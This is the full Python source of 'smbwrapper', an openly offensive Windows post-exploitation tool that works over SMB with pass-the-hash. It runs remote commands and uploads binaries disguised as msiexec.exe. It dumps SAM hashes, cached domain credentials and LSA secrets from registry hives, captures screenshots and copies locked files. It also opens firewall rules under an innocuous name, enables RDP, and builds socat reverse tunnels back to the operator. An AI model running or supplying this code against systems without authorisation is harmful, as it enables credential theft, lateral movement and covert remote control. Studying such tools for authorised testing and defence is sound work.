#!/usr/bin/env python
# Copyright (C) 2015 jeremy s.
# Contact: jrm` on irc.freenode.net

# This program is free software: you can redistribute it and/or modify it
# under the terms of the GNU General Public License as published by the Free
# Software Foundation, either version 3 of the License, or (at your option)
# any later version.

# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or
# FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License for
# more details.

# You should have received a copy of the GNU General Public License along
# with this program.  If not, see <http://www.gnu.org/licenses/>.

import sys, os, time, string, socket, subprocess, inspect

try:
	import sqlite3
except:
	print "[!] Please install python-sqlite3 extension."
	sys.exit(0)

__version__ = '1.0.1alpha'
__author__ = 'jrm`'
__description__ = 'Run stuff remotely - Pass the Hash'

BASEDIR = os.path.dirname(os.path.realpath(__file__)) + '/tools'
TOOLS = {
	'smbclient': BASEDIR +  '/smbclient', # Version with Pass-The-Hash support
	'winexe': BASEDIR + '/winexe-1.1-x64-static', # Version with Pass-The-Hash support
	'vsscpy': BASEDIR + '/win/vsscpy.vbs',
	'xfreerdp': BASEDIR + '/xfreerdp',
	'socat': BASEDIR + '/socat',
	'socat.tar': BASEDIR + '/win/socat.tar',
	'tar': BASEDIR + '/win/tar.exe',
	'nircmd': BASEDIR + '/win/nircmd.exe',
	'runastask': BASEDIR + '/win/runastask.exe',
	'logparser': BASEDIR + '/win/logparser.exe',
	'mbsa': {'dll': BASEDIR + '/win/mbsa/$ARCH$/wusscan.dll', 'exe': BASEDIR + '/win/mbsa/$ARCH$/mbsacli.exe', 'cab': BASEDIR + '/win/mbsa/wsusscn2.cab', 'bat': BASEDIR + '/win/mbsa/mbsa.bat'},
}
CONF = {
	'system': False,
	'creds_file': os.environ['HOME'] + '/.smbwrapper.vault',
	'verbose': True,
	'smb_user': '',
	'smb_pass': '',
	'smb_hash': '',
	'smb_ip': '',
}

def main():
	sys.argv[0] = os.path.basename(sys.argv[0])

	if len(sys.argv) < 2 or '-h' in sys.argv or 'help' in sys.argv:
		usage()

	# Enable LocalSystem elevation where possible
	if '-s' in sys.argv:
		CONF['system'] = True
		sys.argv = [x for x in sys.argv if x != '-s']

	# Use an alternate credential vault
	if '-f' in sys.argv:
		pos = sys.argv.index('-f')
		try:
			CONF['creds_file'] = sys.argv[pos+1]
			del sys.argv[pos:pos+1]
		except:
			text("[!] Option -f requires an argument.", 1)

	check_vault()

	if not os.path.exists(CONF['creds_file']):
		text("[!] %s: file not found." % CONF['creds_file'], 1)

	# Check command validity and jump to main function
	command = 'smb_%s' % sys.argv[1]
	if command in dict(get_commands()).keys():

		if len(sys.argv) < 3:
			usage()

		if sys.argv[1] not in ['creds', 'hash'] and 'update' not in sys.argv:

			try:
				CONF['smb_ip'] = socket.gethostbyname(sys.argv[2])
			except socket.gaierror:
				text("[!] Unable to resolve hostname.", 1)
			except:
				usage()

			if sys.argv[1] not in ['rdp', 'mount']:
				check_host()

		globals()[command]()

	else:
		text("[!] Not a valid smbwrapper command.", 1)

def color(txt, code = 1, modifier = 0):
	return "\033[%d;3%dm%s\033[0m" % (modifier, code, txt)

def text(txt, e = False):

	if CONF['verbose']:

		chars = txt[0:3]

		if txt[0:3] == '[*]':
			ret = color('[*]', 2, 1) + txt[3:]
		elif txt[0:3] == '[!]':
			ret = color('[!]', 1, 1) + txt[3:]
		elif txt[0:3] == '[i]':
			ret = color(txt, 3, 1)
		else:
			ret = txt

	print ret

	if e is not False:
		sys.exit(0)

def check_vault():

	# Creating the vault if it doesn't exist
	if not os.path.exists(CONF['creds_file']):
		cursor = sqlite3.connect(CONF['creds_file'])
		cursor.execute('CREATE TABLE creds (active INTEGER, username varchar(32), password varchar(32), ntlm_hash varchar(32), comment varchar(256))')
		cursor.commit()
		cursor.close()

def check_creds():

	check_tool('smbclient')
	check = smbclient('quit')

	if 'session setup failed' in check or 'tree connect failed' in check:
		text('[!] %s' % check, 1)

	return True

def check_tool(tool):
	if tool in TOOLS.keys():
		return check_tool(TOOLS[tool]) if isinstance(TOOLS[tool], dict) else check_path(TOOLS[tool])

	return False

def check_host():
	try:
		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
		sock.settimeout(2)
		sock.connect((CONF['smb_ip'], 445))
		sock.close()
	except:
		text("[!] %s: port 445 unreachable" % sys.argv[2], 1)

def check_path(path):
	if '$ARCH$' in path:
		check_path(path.replace('$ARCH$', 'x86'))
		check_path(path.replace('$ARCH$', 'x64'))
	else:
		if not os.path.exists(path):
			text("[!] %s: file not found." % path, 1)

	return True

def get_commands():

	funcs = {}
	for a, b in sys.modules[__name__].__dict__.iteritems():
		if a.startswith('smb_'):
			funcs[id(b)] = a

	commands = []
	for k in sorted(funcs):
		commands.append((funcs[k],  str(globals()[funcs[k]].__doc__).strip()))

	return commands

def usage():

	try: c = os.path.basename(sys.argv[1])
	except: c = 'help'

	f = os.path.basename(__file__)

	print color(f +" v%s by %s - %s\n" % (__version__, __author__, __description__), 6, 1)
	print color(f +" -h", 7, 1) +" \t\t\t This help"
	print color(f +" -f <file>", 7, 1) +"\t\t Specify an alternative credential vault"

	if c == 'help':
		print ""
		print "   " + color("The following commands are currently implemented:\n", 7, 4)

	else:
		print ""
		print color("Command usage:\n", 7, 4);	

	for cmd in get_commands():
		if c == 'help' or c == cmd[0][4:]:
			print "   %s %s %s" % (color(f, 3, 3), color(cmd[0][4:], 3, 1), cmd[1])
			print ""

	print "   If the command supports it, use the "+ color("'-s'", 7, 1) +" option to attempt remote LocalSystem elevation.\n"
	print "   Instead of using username+password or username+hash on the commandline,"
	print "   you can use the "+ color("smb.py", 3, 3) + " " + color("creds", 3, 1) +" command to populate the credential vault.\n"
	print "   Usernames must be specified using the "+ color("DOMAIN\\LOGIN", 7, 1) +" syntax.\n"
	print "   See usage examples at: " + color('https://github.com/jrmdev/smbwrapper/blob/master/README.md', 4, 4)
	print ""

	sys.exit(0)

def creds_from_vault():

	cursor = sqlite3.connect(CONF['creds_file'])

	# Get the number of active credentials
	res = cursor.execute("SELECT COUNT(*) AS count FROM creds WHERE active=1")
	(count,) = res.fetchone()

	if count == 0:
		text("[!] No credentials to use. Use the %s creds command to add some." % sys.argv[0], 1)

	res = cursor.execute("SELECT username, password, ntlm_hash FROM creds WHERE active=1 LIMIT 1")

	for row in res:
		CONF['smb_user'] = row[0]
		CONF['smb_pass'] = row[1]
		CONF['smb_hash'] = row[2]
		os.environ['SMBHASH'] = '00000000000000000000000000000000:' + CONF['smb_hash']

	cursor.close()

def creds_from_cmdline():

	# Parsing command line to get credentials to use
	CONF['smb_user'] = sys.argv[3]

	if all(c in string.hexdigits for c in sys.argv[4]) and len(sys.argv[4]) == 32:
		CONF['smb_pass'] = ''
		CONF['smb_hash'] = sys.argv[4]
		os.environ['SMBHASH'] = '00000000000000000000000000000000:' + CONF['smb_hash']
	
	else:
		CONF['smb_pass'] = sys.argv[4]
		CONF['smb_hash'] = ntlm_hash(sys.argv[4])

	del sys.argv[2:4]

def set_creds(length):

	if len(sys.argv) >= length+2:
		creds_from_cmdline()

	elif len(sys.argv) >= length:
		creds_from_vault()

	else:
		usage()

def ntlm_hash(str):
	import hashlib, binascii
	h = hashlib.new('md4', str.encode('utf-16le')).digest()
	return binascii.hexlify(h).upper()

def download_file(src, dst, statusbar = True):
	from urllib2 import urlopen

	u = urlopen(src)
	f = open(dst, 'wb')

	meta = u.info()
	file_size = int(meta.getheaders("Content-Length")[0])
	
	if file_size == 0:
		text("[!] Error: File empty.")

	text("[*] File Size: %s" % file_size)

	file_size_dl = 0
	block_sz = 8192

	try:
		while True:
			buffer = u.read(block_sz)
		
			if not buffer:
				break
		
			file_size_dl += len(buffer)
			f.write(buffer)
		
			status = r"%10d  [%3.2f%%]" % (file_size_dl, file_size_dl * 100. / file_size)
			status = status + chr(8)*(len(status)+1)
		
			if statusbar:
				sys.stdout.write(status)

		print ""

	except KeyboardInterrupt:
		f.close()
		print "\r"
		text("[*] Exiting...", 1)

	f.close()

def smbclient(cmd):
	check_tool('smbclient')
	creds = '%s%%%s' % (CONF['smb_user'], CONF['smb_pass'])

	run = []
	run.append(TOOLS['smbclient'])
	run.append('-U')
	run.append(creds)
	run.append('//'+ CONF['smb_ip'] +'/c$')
	run.append('-c')
	run.append(cmd)

	process = subprocess.Popen(run, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
	
	ret = process.stdout.read()
	ret = ret.replace('\x00', '')
	return ret.strip()

def winexe(cmd):
	check_tool('winexe')
	creds = '%s%%%s' % (CONF['smb_user'], CONF['smb_pass'])

	run = []
	run.append(TOOLS['winexe'])
	if CONF['system']:
		run.append('--system')
	run.append('--uninstall')
	run.append('--interactive=0')
	run.append('-U')
	run.append(creds)
	run.append('//'+ CONF['smb_ip'])
	run.append(cmd)

	if not cmd.lower().startswith('cmd'):
		process = subprocess.Popen(run, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
		
		ret = process.stdout.read()
		ret = ret.replace('\x00', '')
		return ret.strip()

	# For an interactive command line, don't use popen
	os.spawnvpe(os.P_WAIT, run[0], run, os.environ)
	return ''

def os_architecture():
	return 32 if 'NO_SUCH_FILE' in smbclient('dir "\\Program Files (x86)"') else 64

def screen_resolution():
	xrandr = subprocess.Popen(['xrandr', '--current'], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.readlines()
	
	for l in xrandr:
		if '*' in l:
			return l.split()[0].split('x')

	return ['1024', '768']

def up_and_exec(localcmd, delete_after = True):

	if os.path.exists(localcmd[0]):

		smbclient('put "%s" "\\windows\\temp\\msiexec.exe"' % localcmd[0])
		ret = winexe('\\windows\\temp\\msiexec.exe %s' % ' '.join(localcmd[1:]))

		print '\\windows\\temp\\msiexec.exe %s' % ' '.join(localcmd[1:])

		if delete_after:
			smbclient('del "\\windows\\temp\\msiexec.exe"')

		return ret

	else:
		text("[!] %s: file not found." % localcmd[0], 1)

def smb_creds():
	"""
	[ list | set | del | use ] <user> <passwd/nthash>
	Manage SMB credentials
	"""

	if len(sys.argv) < 3:
		usage()

	if sys.argv[2] == 'list':
		cursor = sqlite3.connect(CONF['creds_file'])
		res = cursor.execute('SELECT * FROM creds')
		
		for row in res:
			print 'Active   : %s' % ('*' if row[0] != 0 else '')
			print 'Username : %s' % row[1]
			print 'Passwd   : %s' % row[2]
			print 'NT Hash  : %s' % row[3]
			print 'Comment  : %s' % row[4]
			print "-- "
		
		cursor.close()
	else:
		u = p = h = c = ''

		if len(sys.argv) > 3:
			u = sys.argv[3].split('\\', 2)

			if len(u) > 1:
				d = u.pop(0).upper()
				u = '%s\\%s' % (d, string.capwords(u.pop(0)))
			else:
				u = '\\'.join(u)

		if len(sys.argv) > 4:
			# We have a NT Hash instead of a password
			if all(c in string.hexdigits for c in sys.argv[4]) and len(sys.argv[4]) == 32:
				p = ''
				h = sys.argv[4].upper()
			else:
				p = sys.argv[4]
				h = ntlm_hash(p)

		if len(sys.argv) > 5:
			c = sys.argv[5]

		# Get the number of matching usernames in db for below use
		cursor = sqlite3.connect(CONF['creds_file'])
		res = cursor.execute("SELECT COUNT(*) AS count FROM creds WHERE LOWER(username)=LOWER(?)", (u,))
		(count,) = res.fetchone()
		cursor.close()

	if sys.argv[2] == 'set' or sys.argv[2] == 'add':

		if len(sys.argv) >= 5:

			cursor = sqlite3.connect(CONF['creds_file'])

			# Insert or update credential
			if count == 0:
				cursor.execute("UPDATE creds SET active=0")
				cursor.execute("INSERT INTO creds VALUES(1, ?, ?, ?, ?)", (u, p, h, c))
				cursor.commit()
				text("[*] Credentials added and marked as active.")
			else:
				cursor.execute("UPDATE creds SET active=0")
				cursor.execute("UPDATE creds SET active=1, password = ?, ntlm_hash = ?, comment = ? WHERE LOWER(username)=LOWER(?)", (p, h, c, u))
				cursor.commit()
				text("[*] Credentials updated and marked as active.")

			cursor.close()

	if sys.argv[2] == 'del':
		
		if len(sys.argv) == 4:

			cursor = sqlite3.connect(CONF['creds_file'])

			# Delete credential
			if count == 1:
				cursor.execute("DELETE FROM creds WHERE LOWER(username)=LOWER(?)", (u,))
				cursor.commit()
				text("[*] Credentials removed for '%s'." % u)
			else:
				text("[!] No such credentials in vault.")

			cursor.close()

	if sys.argv[2] == 'use':
		
		if len(sys.argv) == 4:

			cursor = sqlite3.connect(CONF['creds_file'])

			# Mark credential active
			if count == 1:
				cursor.execute("UPDATE creds SET active=0")
				cursor.execute("UPDATE creds SET active=1 WHERE LOWER(username)=LOWER(?)", (u,))
				cursor.commit()
				text("[*] Active credentials set to '%s'." % u)
			else:
				text("[!] No credentials found for this username.")

			cursor.close()

def smb_exec():
	"""
	[-s] <ip> [ user ] [ passwd/nthash ] <cmd>
	Execute a command remotely (use "cmd" for a command prompt)
	"""

	set_creds(4)
	check_creds()
	print winexe(' '.join(sys.argv[3:]))

def smb_upexec():
	"""
	[-s] <ip> [ user ] [ passwd/nthash ] <localfile.exe [-arg1 [-argx]]>
	Upload a file and run it remotely with the specified arguments
	"""

	set_creds(4)
	check_creds()
	print up_and_exec(sys.argv[3:])

def smb_upload():
	"""
	[-s] <ip> [ user ] [ passwd/nthash ] <localfile> <remotefile>
	Upload a file to the host
	"""

	set_creds(5)
	check_creds()

	if len(sys.argv) != 5:
		usage()

	if os.path.exists(sys.argv[3]):
		print smbclient('put "%s" "%s"' % (sys.argv[3], sys.argv[4]))
	else:
		text("[!] %s: file not found." % sys.argv[3], 1)

def smb_download():
	"""
	[-s] <ip> [ user ] [ passwd/nthash ] <remotefile> <localfile>
	Download a file from the host
	"""

	set_creds(5)
	check_creds()

	if len(sys.argv) != 5:
		usage()

	print smbclient('get "%s" "%s"' % (sys.argv[3], sys.argv[4]))

def smb_creddump():
	"""
	[-s] <ip> [ user ] [ passwd/nthash ]
	Extract SAM, SECURITY, SYSTEM hives and dump SAM, DCC, LSA Secrets
	"""

	try:
		sys.path.insert(0, BASEDIR + '/creddump')
		from framework.win32 import hashdump, domcachedump, lsasecrets
	except:
		text("[!] Error: Creddump dependency missing.", 1)

	set_creds(3)

	text("[*] Extracting hives...")

	tmpfile = '/tmp/cred_run.bat'

	bat = ['@echo off', 'cd \\windows\\temp', 
		'reg save HKLM\\SAM sam.hive /y',
		'reg save HKLM\\SYSTEM system.hive /y',
		'reg save HKLM\\SECURITY security.hive /y']

	open(tmpfile, 'w').write('\r\n'.join(bat))

	smbclient('put "%s" "\\windows\\temp\\cred_run.bat"' % tmpfile)
	print winexe('\\windows\\temp\\cred_run.bat')

	text("[*] Downloading hives...")
	smbclient('get "\\windows\\temp\\sam.hive" "%s_sam.hive"' % CONF['smb_ip'])
	smbclient('get "\\windows\\temp\\system.hive" "%s_system.hive"' % CONF['smb_ip'])
	smbclient('get "\\windows\\temp\\security.hive" "%s_security.hive"' % CONF['smb_ip'])

	text("[*] Removing temp files...")
	smbclient('del "\\windows\\temp\\cred_run.bat"')
	smbclient('del "\\windows\\temp\\sam.hive"')
	smbclient('del "\\windows\\temp\\system.hive"')
	smbclient('del "\\windows\\temp\\security.hive"')
	os.unlink(tmpfile)

	text("[*] Extracting SAM credentials...")
	hashdump.dump_file_hashes(CONF['smb_ip'] + '_system.hive', CONF['smb_ip'] + '_sam.hive')

	text("[*] Extracting MSCASH credentials...")
	domcachedump.dump_file_hashes(CONF['smb_ip'] + '_system.hive', CONF['smb_ip'] + '_security.hive')

	# Code below ripped from creddump's lsadump.py
	text("[*] Extracting LSA Secrets...")
	try:
		FILTER = ''.join([(len(repr(chr(x)))==3) and chr(x) or '.' for x in range(256)])
		secrets = lsasecrets.get_file_secrets(CONF['smb_ip'] + '_system.hive', CONF['smb_ip'] + '_security.hive')

		if not secrets:
			text("[!] Unable to read LSA secrets.")

		else:
			for k in secrets:
				N = 0
				length = 16
				result = ''
				while secrets[k]:
					s, secrets[k] = secrets[k][:length],secrets[k][length:]
					hexa = ' '.join(["%02X" % ord(x) for x in s])
					s = s.translate(FILTER)
					result += "%04X   %-*s   %s\n" % (N, length*3, hexa, s)
					N += length
				
				print k
				print result
	except:
		pass

	text("[*] SYSTEM, SAM and SECURITY hives were saved in the current directory.")

def smb_lastlog():
	"""
	[-s] <ip> [ user ] [ passwd/nthash ] <username>
	Retrieves last known IPs for given user from the DC's Event Logs. Provide DC IP.
	"""

	set_creds(4)
	check_tool('logparser')
	check_creds()

	text("[*] Getting last 3 known IP addresses...")

	smbclient('put "%s" "\\windows\\temp\\msiexec.exe"' % TOOLS['logparser'])
	print winexe("\\windows\\temp\\msiexec.exe -q -i EVT \"SELECT TOP 3 EXTRACT_TOKEN(Strings, 6, '|') AS Domain, EXTRACT_TOKEN(Strings, 5, '|') AS User, EXTRACT_TOKEN(Strings, 18, '|') AS IP  FROM Security WHERE EventType=8 /*AND EventCategory=12544*/ AND STRLEN(IP) > 3 AND User='%s'\""% sys.argv[3])
	smbclient('del "\\windows\\temp\\msiexec.exe"')

def smb_scrshot():
	"""
	[-s] <ip> [ user ] [ passwd/nthash ]
	Takes a screenshot of the active session
	"""

	set_creds(3)
	check_tool('runastask')
	check_tool('nircmd')

	text("[*] Uploading tools...")
	smbclient('put "%s" "\\windows\\temp\\r.exe"' % TOOLS['runastask'])
	smbclient('put "%s" "\\windows\\temp\\n.exe"' % TOOLS['nircmd'])

	text("[*] Capturing screenshot...")
	filename = '/tmp/screenshot.%s.png' % str(time.time())

	winexe('\\windows\\temp\\r.exe %s C:\\windows\\temp\\n.exe savescreenshotfull C:\\windows\\temp\\s.png' % CONF['smb_user'])
	smbclient('get "\\windows\\temp\\s.png" "%s"' % filename);

	text("[*] Cleaning files...")
	smbclient('del "\\windows\\temp\\n.exe"')
	smbclient('del "\\windows\\temp\\r.exe"')
	smbclient('del "\\windows\\temp\\s.png"')

	if os.path.exists(filename):

		text("[*] Screenshot saved under %s." % filename)
		os.system('display "%s" &' % filename)
		text("[*] Done.")
	
	else:
		text("[!] Failed. Is the user logged in?.", 1)

def smb_vsscpy():
	"""
	[-s] <ip> [ user ] [ passwd/nthash ] <remotefile> <localfile>
	Use shadow copies to download a locked file from the host
	"""

	check_tool('vsscpy')
	set_creds(5)

	if len(sys.argv) != 5:
		usage()

	check_creds()

	remotefile = sys.argv[3]
	localfile = sys.argv[4]

	text("[*] Uploading script...")
	smbclient('put "%s" "\\windows\\temp\\vsscpy.vbs"' % TOOLS['vsscpy'])

	text("[*] Running script...")
	winexe('cscript \\windows\\temp\\vsscpy.vbs "%s"' % remotefile.lower().replace('c:', ''))

	text("[*] Downloading file to '%s'..." % localfile)
	smbclient('get "\\windows\\temp\\temp.tmp" "%s"' % localfile)

	text("[*] Removing temp files...")
	smbclient('del "\\windows\\temp\\temp.tmp"')
	smbclient('del "\\windows\\temp\\vsscpy.vbs"')

	text("[*] Done.")

def smb_fwrule(action = None, param = None):
	"""
	[-s] <ip> [ user ] [ password ] <add | del> <program path | port number>
	Create or remove a rule in the Windows firewall
	"""
	
	if len(inspect.stack()) == 3: # Function called directly from command line

		set_creds(5)
		check_creds()

		if len(sys.argv) != 5 or sys.argv[3] not in ['add', 'del']:
			usage()

		action = sys.argv[3]
		param = sys.argv[4]

	name = 'Core Networking - SMB' # Or whatever you want as a rule name
	param = str(param)

	text("[*] %sing firewall rule..." % ('Add' if action == 'add' else 'Delet'))
	
	if param.isdigit(): # Adding a port rule
		ret = winexe('netsh advfirewall firewall %s rule dir=in name="%s" %s protocol=TCP localport=%s' % 
			(action, name, 'action=allow' if action == 'add' else '', param))

	else: # Adding a program rule
		ret = winexe('netsh advfirewall firewall %s rule dir=out name="%s" %s program="%s"' % 
			(action, name, 'action=allow' if action == 'add' else '', param))

	if 'Ok.' in ret:
		text("[*] Success.")
	else:
		text("[!] Failed.")

def smb_mount():
	"""
	<ip> [ user ] [ password ] <share> <localpath>
	Mount a remote share locally via CIFS (Pass-the-Hash not available)
	"""

	set_creds(5)

	if len(sys.argv) != 5:
		usage()

	share = sys.argv[3]
	localdir = sys.argv[4]

	if not os.path.exists(localdir):
		os.mkdir(localdir)

	if CONF['smb_pass'] == '':
		text("[!] Pass-The-Hash not available for mount.", 1)

	opts = ['password='+ CONF['smb_pass'], 'uid='+ str(os.getuid()), 'gid='+ str(os.getgid()), 'file_mode=0644', 'dir_mode=0755']

	if '\\' in CONF['smb_user']:
		opts += CONF['smb_user'].split('\\')

	else:
		opts += ['username='+ CONF['smb_user']]

	os.system('sudo mount -t cifs -o "%s" "//%s/%s" "%s"' % (','.join(opts), CONF['smb_ip'], share, localdir))

def smb_rdp():
	"""
	<ip> [ user ] [ passwd/nthash ] [ enable | disable ]
	Open a Remote Desktop session using xfreerdp (Pass-the-Hash = restricted admin)
	"""

	if 'enable' in sys.argv:
		set_creds(4)
		text("[*] Updating Registry...")
		winexe('reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
		smb_fwrule('add', 3389)
		sys.exit(0)

	if 'disable' in sys.argv:
		set_creds(4)
		text("[*] Updating Registry...")
		winexe('reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')
		smb_fwrule('del', 3389);
		sys.exit(0)

	set_creds(3)
	check_tool('xfreerdp')

	res = screen_resolution()
	max_res = '%dx%d' % (int(res[0]), int(res[1]) - 50)

	run = []
	run.append(TOOLS['xfreerdp'])
	run.append('/size:%s' % max_res)
	run.append('/t:%s' % CONF['smb_ip'])
	run.append('/v:%s' % CONF['smb_ip'])

	if '\\' in CONF['smb_user']:
		tab = CONF['smb_user'].split('\\', 2)
		run.append('/d:%s' % tab[0])
		run.append('/u:%s' % tab[1])

	else:
		run.append('/u:%s' % CONF['smb_user'])

	if CONF['smb_pass'] == '':
		text("[!] Note: Pass-the-Hash with RDP only works for local admin accounts and under the restricted admin mode.")
		run.append('/pth:%s' % CONF['smb_hash'])
		run.append('/restricted-admin')

	else:
		run.append('/p:%s' % CONF['smb_pass'])

	# Tweak the following to suit your needs
	run.append("+clipboard")
	run.append("+home-drive")
	run.append("-decorations")
	run.append("/cert-ignore") # baaad.

	os.spawnvpe(os.P_WAIT, run[0], run, os.environ)

def smb_portfwd(lport = None, rhost = None, rport = None):
	"""
	[-s] <ip> [ user ] [ passwd/nthash ] <lport> <rhost> <rport>
	Forward a remote port to a remote address
	"""
	
	if len(inspect.stack()) == 3: # Function called directly from command line

		set_creds(6)
		check_creds()

		if len(sys.argv) != 6:
			usage()

		lport = int(sys.argv[3])
		rport = int(sys.argv[5])
		rhost = sys.argv[4]

	text("[*] Setting up port forwarding...")

	ret = winexe("netsh interface portproxy add v4tov4 listenport=%d connectport=%d connectaddress=%s" % 
		(lport, rport, rhost))
	
	text("[i] Connections to %s:%d are now forwarded to %s:%d" % (CONF['smb_ip'], lport, rhost, rport))
	text("[i] Hit CTRL+C when done...")

	try:
		raw_input()
	
	except KeyboardInterrupt:

		sys.stdout.write('\r')
		text("[*] Stopping port forwarding...")
		winexe('netsh interface portproxy reset')

	text("[*] Done.")

def smb_revfwd(lport = None, rhost = None, rport = None):
	"""
	[-s] <ip> [ user ] [ passwd/nthash ] <lport> <rhost> <rport>
	Reverse-forward a remote address/port locally
	"""
	
	if len(inspect.stack()) == 3: # Function called directly from command line

		set_creds(6)
		check_creds()

		if len(sys.argv) != 6:
			usage()

		lport = int(sys.argv[3])
		rport = int(sys.argv[5])
		rhost = sys.argv[4]

	check_tool('socat.tar')
	check_tool('socat')
	check_tool('tar')

	local_if = subprocess.Popen(['ip', 'route', 'get', 'to', CONF['smb_ip']], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.readlines()[0]
	local_if = local_if.strip().split()[-1]

	text("[*] Uploading files...")
	smbclient('put "%s" "\\windows\\temp\\tar.exe"' % TOOLS['tar'])
	smbclient('put "%s" "\\windows\\temp\\socat.tar"' % TOOLS['socat.tar'])

	winexe('\\windows\\temp\\tar.exe xf /windows/temp/socat.tar -C /windows/temp')

	text("[*] Setting up local listener...")
	process = subprocess.Popen([ TOOLS['socat'], 
		'TCP-LISTEN:%d,bind=%s,reuseaddr,fork' % (lport, local_if),
		'TCP-LISTEN:56789,reuseaddr' ])

	smb_fwrule('add', 'C:\\windows\\temp\\socat\\socat.exe')

	text("[*] Creating reverse tunnel...");
	text("[i] %s:%d <--> %s:56789 <--> %s:%d" % (rhost, rport, CONF['smb_ip'], local_if, lport))
	text("[i] Now point your client to %s:%d" % (local_if, lport))
	winexe('\\windows\\temp\\socat\\socat.exe TCP:%s:56789,forever,interval=1 TCP:%s:%d' % (local_if, rhost, rport))

	text("[*] Cleaning up...");
	winexe('cmd /c del /f/q \\windows\\temp\\socat.tar \\windows\\temp\\tar.exe & rmdir /q/s \\windows\\temp\\socat');
	process.terminate()

	smb_fwrule('del', 'C:\\windows\\temp\\socat\\socat.exe');

	text("[*] Done.");

def smb_mbsa():
	"""
	[-s] <ip> [ user ] [ passwd/nthash ] [ update ]
	Run MBSA on the remote host
	"""

	if sys.argv[2] == 'update':
		text("[*] Downloading MBSA catalog updates...")
		download_file("http://go.microsoft.com/fwlink/?LinkId=76054", TOOLS['mbsa']['cab'])
		text("[*] Done.", 1)

	if not os.path.exists(TOOLS['mbsa']['cab']):
		text("[!] MBSA cab file not found. To download, run '%s mbsa update'" % sys.argv[0], 1)

	set_creds(3)
	check_tool('mbsa')

	text("[*] Preparing MBSA...")

	arch = 'x86' if os_architecture() == 32 else 'x64'
	TOOLS['mbsa']['exe'] = TOOLS['mbsa']['exe'].replace('$ARCH$', arch)
	TOOLS['mbsa']['dll'] = TOOLS['mbsa']['dll'].replace('$ARCH$', arch)

	import tarfile
	archive = tarfile.open('/tmp/mbsa.tar', mode='w')
	
	try:
		for k, v in TOOLS['mbsa'].iteritems():
			archive.add(v, arcname=os.path.basename(v))
	finally:
		archive.close()

	text("[*] Uploading files...")

	smbclient('put "%s" "\\windows\\temp\\tar.exe"' % TOOLS['tar'])
	smbclient('put "/tmp/mbsa.tar" "\\windows\\temp\\mbsa.tar"')
	smbclient('mkdir \\windows\\temp\\mbsa')
	os.unlink('/tmp/mbsa.tar')

	text("[*] Running...")

	winexe('\\windows\\temp\\tar.exe xf /windows/temp/mbsa.tar -C /windows/temp/mbsa')
	winexe('\\windows\\temp\\mbsa\\mbsa.bat')

	text("[*] Downloading results...")
	smbclient('get "\\windows\\temp\\mbsa\\results.xml" "/tmp/mbsa_%s.xml"' % CONF['smb_ip']);

	text("[*] Cleaning up...");
	winexe('cmd /c del /f/q \\windows\\temp\\mbsa.tar \\windows\\temp\\tar.exe & rmdir /q/s \\windows\\temp\\mbsa');

	if os.path.exists('/tmp/mbsa_%s.xml' % CONF['smb_ip']):
		text("[*] Excel-friendly results saved under /tmp/mbsa_%s.xml" % CONF['smb_ip'])
	else:
		text("[!] Failed.")

def smb_hash():
	"""
	<plaintext>
	Generate a NTLM hash from a plaintext
	"""

	print ntlm_hash(sys.argv[2])

if __name__ == "__main__":
	main()
